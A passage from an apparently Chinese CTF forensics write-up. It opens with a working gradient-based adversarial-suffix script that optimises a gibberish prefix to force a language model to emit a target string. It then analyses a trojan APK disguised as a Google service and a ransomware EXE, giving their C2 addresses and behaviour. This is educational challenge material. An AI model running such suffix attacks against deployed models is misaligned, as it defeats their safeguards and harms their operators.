<span class="number">1</span>).to(model.device)</span><br><span class="line">    ids = torch.scatter(</span><br><span class="line">        input_ids.unsqueeze(<span class="number">0</span>).repeat(test_ids.shape[<span class="number">0</span>], <span class="number">1</span>).to(model.device),</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        locs,</span><br><span class="line">        test_ids</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> pad_tok &gt;= <span class="number">0</span>:</span><br><span class="line">        attn_mask = (ids != pad_tok).<span class="built_in">type</span>(ids.dtype)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        attn_mask = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> return_ids:</span><br><span class="line">        <span class="keyword">del</span> locs, test_ids</span><br><span class="line">        gc.collect()</span><br><span class="line">        <span class="keyword">return</span> forward(model=model, input_ids=ids, attention_mask=attn_mask, batch_size=batch_size), ids</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">del</span> locs, test_ids</span><br><span class="line">        logits = forward(model=model, input_ids=ids,</span><br><span class="line">                         attention_mask=attn_mask, batch_size=batch_size)</span><br><span class="line">        <span class="keyword">del</span> ids</span><br><span class="line">        gc.collect()</span><br><span class="line">        <span class="keyword">return</span> logits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">*, model, input_ids, attention_mask, batch_size=<span class="number">512</span></span>):</span><br><span class="line"></span><br><span class="line">    logits = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, input_ids.shape[<span class="number">0</span>], batch_size):</span><br><span class="line"></span><br><span class="line">        batch_input_ids = input_ids[i:i+batch_size]</span><br><span class="line">        <span class="keyword">if</span> attention_mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            batch_attention_mask = attention_mask[i:i+batch_size]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            batch_attention_mask = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        logits.append(model(input_ids=batch_input_ids,</span><br><span class="line">                      attention_mask=batch_attention_mask).logits)</span><br><span class="line"></span><br><span class="line">        gc.collect()</span><br><span class="line">        <span class="keyword">del</span> batch_input_ids, batch_attention_mask</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> torch.cat(logits, dim=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target_loss</span>(<span class="params">logits, ids, target_slice</span>):</span><br><span class="line">    crit = nn.CrossEntropyLoss(reduction=<span class="string">&#x27;none&#x27;</span>)</span><br><span class="line">    loss_slice = <span class="built_in">slice</span>(target_slice.start-<span class="number">1</span>, target_slice.stop-<span class="number">1</span>)</span><br><span class="line">    loss = crit(logits[:, loss_slice, :].transpose(<span class="number">1</span>, <span class="number">2</span>), ids[:, target_slice])</span><br><span class="line">    <span class="keyword">return</span> loss.mean(dim=-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">model = AutoModelForCausalLM.from_pretrained(</span><br><span class="line">    <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">    torch_dtype=torch.float16,</span><br><span class="line">    trust_remote_code=<span class="literal">True</span>,</span><br><span class="line">).to(device).<span class="built_in">eval</span>()</span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(</span><br><span class="line">    <span class="string">&quot;.&quot;</span>, use_fast=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_success</span>(<span class="params">prompt</span>):</span><br><span class="line">    input_ids = tokenizer.encode(prompt, return_tensors=<span class="string">&quot;pt&quot;</span>)</span><br><span class="line">    output = model.generate(input_ids.to(</span><br><span class="line">        device), max_new_tokens=<span class="number">50</span>, num_beams=<span class="number">1</span>, temperature=<span class="number">0</span>)</span><br><span class="line">    output = output[:, <span class="built_in">len</span>(input_ids[<span class="number">0</span>]):]</span><br><span class="line">    output_text = tokenizer.decode(output[<span class="number">0</span>], skip_special_tokens=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(output_text)</span><br><span class="line">    <span class="keyword">if</span> output_text.lower().find(target.lower()) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">plotlosses = PlotLosses()</span><br><span class="line">adv_slice = <span class="built_in">slice</span>(<span class="number">0</span>, <span class="built_in">len</span>(tokenizer.encode(</span><br><span class="line">    adv_string_init, add_special_tokens=<span class="literal">False</span>)))</span><br><span class="line">target_slice = <span class="built_in">slice</span>(adv_slice.stop, adv_slice.stop +</span><br><span class="line">                     <span class="built_in">len</span>(tokenizer.encode(target, add_special_tokens=<span class="literal">False</span>)))</span><br><span class="line">loss_slice = <span class="built_in">slice</span>(target_slice.start-<span class="number">1</span>, target_slice.stop-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">best_new_adv_prefix = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_steps):</span><br><span class="line"></span><br><span class="line">    input_ids = tokenizer.encode(</span><br><span class="line">        adv_prefix+target, add_special_tokens=<span class="literal">False</span>, return_tensors=<span class="string">&#x27;pt&#x27;</span>).squeeze()</span><br><span class="line"></span><br><span class="line">    input_ids = input_ids.to(device)</span><br><span class="line"></span><br><span class="line">    coordinate_grad = token_gradients(model,</span><br><span class="line">                                      input_ids,</span><br><span class="line">                                      adv_slice,</span><br><span class="line">                                      target_slice,</span><br><span class="line">                                      loss_slice)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line"></span><br><span class="line">        adv_prefix_tokens = input_ids[adv_slice].to(device)</span><br><span class="line"></span><br><span class="line">        new_adv_prefix_toks = sample_control(adv_prefix_tokens,</span><br><span class="line">                                             coordinate_grad,</span><br><span class="line">                                             batch_size)</span><br><span class="line"></span><br><span class="line">        new_adv_prefix = get_filtered_cands(tokenizer,</span><br><span class="line">                                            new_adv_prefix_toks,</span><br><span class="line">                                            filter_cand=<span class="literal">True</span>,</span><br><span class="line">                                            curr_control=adv_prefix)</span><br><span class="line"></span><br><span class="line">        logits, ids = get_logits(model=model,</span><br><span class="line">                                 tokenizer=tokenizer,</span><br><span class="line">                                 input_ids=input_ids,</span><br><span class="line">                                 control_slice=adv_slice,</span><br><span class="line">                                 test_controls=new_adv_prefix,</span><br><span class="line">                                 return_ids=<span class="literal">True</span>,</span><br><span class="line">                                 batch_size=batch_size)  <span class="comment"># decrease this number if you run into OOM.</span></span><br><span class="line"></span><br><span class="line">        losses = target_loss(logits, ids, target_slice)</span><br><span class="line"></span><br><span class="line">        best_new_adv_prefix_id = losses.argmin()</span><br><span class="line">        best_new_adv_prefix = new_adv_prefix[best_new_adv_prefix_id]</span><br><span class="line"></span><br><span class="line">        current_loss = losses[best_new_adv_prefix_id]</span><br><span class="line"></span><br><span class="line">        adv_prefix = best_new_adv_prefix</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create a dynamic plot for the loss.</span></span><br><span class="line">    plotlosses.update(&#123;<span class="string">&#x27;Loss&#x27;</span>: current_loss.detach().cpu().numpy()&#125;)</span><br><span class="line">    plotlosses.send()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Current Prefix:<span class="subst">&#123;best_new_adv_prefix&#125;</span>&quot;</span>, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> is_success(best_new_adv_prefix):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">del</span> coordinate_grad, adv_prefix_tokens</span><br><span class="line">    gc.collect()</span><br><span class="line">    torch.cuda.empty_cache()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> is_success(best_new_adv_prefix):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SUCCESS:&quot;</span>, best_new_adv_prefix)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们需要把exp放到story目录下执行。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425212131850.png" alt="image-20250425212131850"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hutuckle!!!!!!!! alike custod locker Goal!!!!!!!! sit often!!!!!!!!alwaysremember Jonas!!!!!!!!!!!!!!!!escIssMU bes arrangementsque spends humiliation dedication</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425220010348.png" alt="image-20250425220010348"></p><p>注意此处开头有一个空格，一定要一模一样才行！！</p><h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425164639018.png" alt="image-20250425164639018"></p><p>解包后四个flag全在源码里了！！</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428110540237.png" alt="image-20250428110540237"></p><h2 id="手机部分"><a href="#手机部分" class="headerlink" title="手机部分"></a>手机部分</h2><h3 id="T26"><a href="#T26" class="headerlink" title="T26"></a>T26</h3><blockquote><p>该检材的备份提取时间（UTC）(格式：2020&#x2F;1&#x2F;1 01:01:01)</p></blockquote><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428110549625.png" alt="image-20250428110549625" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025/4/15 18:11:18</span><br></pre></td></tr></table></figure><h3 id="T27"><a href="#T27" class="headerlink" title="T27"></a>T27</h3><blockquote><p>分析倩倩的手机检材,手机内Puzzle_Game拼图程序拼图APK中的Flag1是什么(格式:xxxxxxxxx)</p></blockquote><p>我们反编译一下Puzzle_Game看看，发现有个flagactivity。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425222923272.png" alt="image-20250425222923272"></p><p>关键点在于此处的<code>String flag = AESUtil.decryptFlag();</code></p><p>跟进decryptFlag方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decryptFlag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> lastByte;</span><br><span class="line">    <span class="type">int</span> resultLength;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        mInvocationCount++;</span><br><span class="line">        <span class="type">byte</span>[] keyBytes = generateWhiteBoxKey();</span><br><span class="line">        <span class="type">byte</span>[] cipherBytes = assembleCipherText();</span><br><span class="line">        <span class="keyword">if</span> (mInvocationCount % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            Thread.sleep(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">100</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] expanded = expandKey(keyBytes);</span><br><span class="line">        <span class="type">byte</span>[] decrypted = decryptAESBlock(cipherBytes, expanded);</span><br><span class="line">        <span class="keyword">if</span> (decrypted != <span class="literal">null</span> &amp;&amp; decrypted.length &gt; <span class="number">0</span> &amp;&amp; (lastByte = decrypted[decrypted.length - <span class="number">1</span>] &amp; <span class="number">255</span>) &gt; <span class="number">0</span> &amp;&amp; lastByte &lt;= <span class="number">16</span> &amp;&amp; (resultLength = decrypted.length - lastByte) &gt;= <span class="number">0</span> &amp;&amp; resultLength &lt;= decrypted.length) &#123;</span><br><span class="line">            <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[resultLength];</span><br><span class="line">            System.arraycopy(decrypted, <span class="number">0</span>, result, <span class="number">0</span>, resultLength);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(result, StandardCharsets.UTF_8);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (decrypted != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decrypted, StandardCharsets.UTF_8);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;解密失败: 结果为空&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;解密失败: &quot;</span> + e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成密钥的逻辑主要如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] generateWhiteBoxKey() &#123;</span><br><span class="line">    <span class="type">byte</span>[] keyBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[MAGIC_NUMBERS.length];</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bArr = MAGIC_NUMBERS;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; bArr.length) &#123;</span><br><span class="line">            keyBytes[i] = (<span class="type">byte</span>) (bArr[i] ^ <span class="number">6</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> keyBytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那个expandkey函数不用管，其实就是<strong>AES（高级加密标准）的密钥扩展（Key Expansion）算法实现</strong>，用于将输入的初始密钥（通常为 16 字节）扩展为一个更长的轮密钥（176 字节，对应 AES-128 的 11 轮加密所需的子密钥）。</p><p>首先获取一下key</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425223516381.png" alt="image-20250425223516381"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weZl_d0wn_sbwyz_</span><br></pre></td></tr></table></figure><p>然后我们找密文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] hexStringToByteArray(String s) &#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        s = <span class="string">&quot;0&quot;</span> + s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">    <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[len / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> Character.digit(s.charAt(i), <span class="number">16</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> Character.digit(s.charAt(i + <span class="number">1</span>), <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span> (high == -<span class="number">1</span> || low == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;无效的十六进制字符&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            data[i / <span class="number">2</span>] = (<span class="type">byte</span>) ((high &lt;&lt; <span class="number">4</span>) | low);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">80</span>, -<span class="number">52</span>, <span class="number">4</span>, <span class="number">49</span>, <span class="number">53</span>, <span class="number">6</span>, Byte.MIN_VALUE, -<span class="number">61</span>, <span class="number">10</span>, <span class="number">94</span>, -<span class="number">59</span>, <span class="number">25</span>, <span class="number">82</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">12</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80, -52, 4, 49, 53, 6, -128, -61, 10, 94, -59, 25, 82, 115, 109, 12</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425224225544.png" alt="image-20250425224225544"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Key_1n_the_P1c</span><br></pre></td></tr></table></figure><h3 id="T28"><a href="#T28" class="headerlink" title="T28"></a>T28</h3><blockquote><p>分析手机内Puzzle_Game拼图程序，请问最终拼成功的图片是哪所大学(格式：浙江大学)</p></blockquote><p>解压APK，发现图片</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425224351931.png" alt="image-20250425224351931"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/pic1.jpg" alt="pic1"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425224617748.png" alt="image-20250425224617748"></p><h3 id="T29"><a href="#T29" class="headerlink" title="T29"></a>T29</h3><blockquote><p>分析倩倩的手机检材,木马app是怎么被安装的（网址）(格式：<a href="http://127.0.0.1:1234/">http://127.0.0.1:1234/</a>)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425224720468.png" alt="image-20250425224720468"></p><h3 id="T30"><a href="#T30" class="headerlink" title="T30"></a>T30</h3><blockquote><p>分析倩倩的手机检材,检材内的木马app的hash是什么(格式：大写md5)</p></blockquote><p>这个木马其实就是此处的fix2_sign.apk</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425224803218.png" alt="image-20250425224803218"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425224840914.png" alt="image-20250425224840914"></p><p>一眼后门！</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425224921331.png" alt="image-20250425224921331"></p><h3 id="T31"><a href="#T31" class="headerlink" title="T31"></a>T31</h3><blockquote><p>分析倩倩的手机检材,检材内的木马app的应用名称是什么(格式：Baidu)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Google Service Framework</span><br></pre></td></tr></table></figure><h3 id="T32"><a href="#T32" class="headerlink" title="T32"></a>T32</h3><blockquote><p>分析倩倩的手机检材,检材内的木马app的使用什么加固(格式：腾讯乐固)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425225019170.png" alt="image-20250425225019170"></p><h3 id="T33"><a href="#T33" class="headerlink" title="T33"></a>T33</h3><blockquote><p>分析倩倩的手机检材,检材内的木马软件所关联到的ip和端口是什么(格式：127.0.0.1:1111)</p></blockquote><p>直接用火眼的apk分析工具来脱壳</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426001051743.png" alt="image-20250426001051743"></p><h3 id="T34"><a href="#T34" class="headerlink" title="T34"></a>T34</h3><blockquote><p>该木马app控制手机摄像头拍了几张照片(格式：1)</p></blockquote><p>服务器的tmp目录保存了照片。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425234317125.png" alt="image-20250425234317125"></p><h3 id="T35"><a href="#T35" class="headerlink" title="T35"></a>T35</h3><blockquote><p>木马APP被使用的摄像头为(格式：Camera)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250425234516069.png" alt="image-20250425234516069"></p><p>我们看到选择了1，也就是前置摄像头。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">front camera</span><br></pre></td></tr></table></figure><h3 id="T36"><a href="#T36" class="headerlink" title="T36"></a>T36</h3><blockquote><p>分析倩倩的手机检材,木马APK通过调用什么api实现自身持久化(格式：JobStore)</p></blockquote><p>此时雷电APP逆向的ai大模型就起到了显著作用。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426001451036.png" alt="image-20250426001451036"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jobScheduler</span><br></pre></td></tr></table></figure><h3 id="T37"><a href="#T37" class="headerlink" title="T37"></a>T37</h3><blockquote><p>分析倩倩的手机检材,根据倩倩的身份证号请问倩倩来自哪里（格式：北京市西城区）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428110754657.png" alt="image-20250428110754657"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上海市徐汇区</span><br></pre></td></tr></table></figure><h3 id="T38"><a href="#T38" class="headerlink" title="T38"></a>T38</h3><blockquote><p>此手机检材的IMEI号是多少(格式：1234567890)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426002027039.png" alt="image-20250426002027039"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">865372026366143</span><br></pre></td></tr></table></figure><h2 id="exe逆向部分"><a href="#exe逆向部分" class="headerlink" title="exe逆向部分"></a>exe逆向部分</h2><h3 id="T39"><a href="#T39" class="headerlink" title="T39"></a>T39</h3><blockquote><p>分析GIFT.exe，该程序的md5是什么(格式：大写md5)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427142023025.png" alt="image-20250427142023025"></p><p>我们在windows.e01桌面的倩倩的生日礼物文件夹中发现了GIFT.exe</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427142217805.png" alt="image-20250427142217805"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5a20b10792126ffa324b91e506f67223</span><br></pre></td></tr></table></figure><h3 id="T40"><a href="#T40" class="headerlink" title="T40"></a>T40</h3><blockquote><p>GIFT.exe的使用的编程语言是什么(格式：C)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427142346353.png" alt="image-20250427142346353"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python</span><br></pre></td></tr></table></figure><h3 id="T41"><a href="#T41" class="headerlink" title="T41"></a>T41</h3><blockquote><p>解开得到的LOVE2.exe的编译时间(格式：2025&#x2F;1&#x2F;1 01:01:01)</p></blockquote><p>运行后出现一个弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427142624649.png" alt="image-20250427142624649"></p><p>应该是倩倩的生日，我们去找一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20010811</span><br></pre></td></tr></table></figure><p>注意这里执行的时候我们要用虚拟机，因为这是病毒。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427142805000.png" alt="image-20250427142805000"></p><p>然后我们转到文件所在位置，分析一下LOVE2.exe这个病毒文件。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427143219504.png" alt="image-20250427143219504"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025-04-08 09:59:40</span><br></pre></td></tr></table></figure><h3 id="T42"><a href="#T42" class="headerlink" title="T42"></a>T42</h3><blockquote><p>分析GIFT.exe，该病毒所关联到的ip和端口(格式：127.0.0.1:1111)</p></blockquote><p>我们用奇安信云沙箱来分析一下。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427144645935.png" alt="image-20250427144645935"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">106.46.26.92:80</span><br></pre></td></tr></table></figure><h3 id="T43"><a href="#T43" class="headerlink" title="T43"></a>T43</h3><blockquote><p>分析GIFT.exe，该病毒修改的壁纸md5(格式：大写md5)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427144839062.png" alt="image-20250427144839062"></p><p>我们在病毒释放文件夹的上一层文件夹中发现了壁纸文件。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427144932752.png" alt="image-20250427144932752"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">733FC4483C0E7DB1C034BE5246DF5EC0</span><br></pre></td></tr></table></figure><h3 id="T44"><a href="#T44" class="headerlink" title="T44"></a>T44</h3><blockquote><p>分析GIFT.exe，为对哪些后缀的文件进行加密： A.doc B.xlsx C.jpg D.png E.ppt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427145513336.png" alt="image-20250427145513336"></p><p>打开ida分析，尝试在strings中搜索doc，发现存在，跟进到相关地址。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427145552676.png" alt="image-20250427145552676"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABE</span><br></pre></td></tr></table></figure><h3 id="T45"><a href="#T45" class="headerlink" title="T45"></a>T45</h3><blockquote><p>分析GIFT.exe，病毒加密后的文件类型是什么(格式：DOCX文档)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427145932803.png" alt="image-20250427145932803"></p><p>直接实践一下即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOVE Encrypted File</span><br></pre></td></tr></table></figure><h3 id="T46"><a href="#T46" class="headerlink" title="T46"></a>T46</h3><blockquote><p>分析GIFT.exe，壁纸似乎被隐形水印加密过了？请找到其中的Flag3(格式：flag3{xxxxxxxx})</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427150200206.png" alt="image-20250427150200206"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag3&#123;20241224_Our_First_Meet&#125;</span><br></pre></td></tr></table></figure><h3 id="T47"><a href="#T47" class="headerlink" title="T47"></a>T47</h3><blockquote><p>分析GIFT.exe，病毒加密文件所使用的方法是什么(格式：Base64)</p></blockquote><p>用ida分析一下</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427150821203.png" alt="image-20250427150821203"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427151338054.png" alt="image-20250427151338054"></p><p>sub_140001F80就是实现加密的函数</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250427151518537.png" 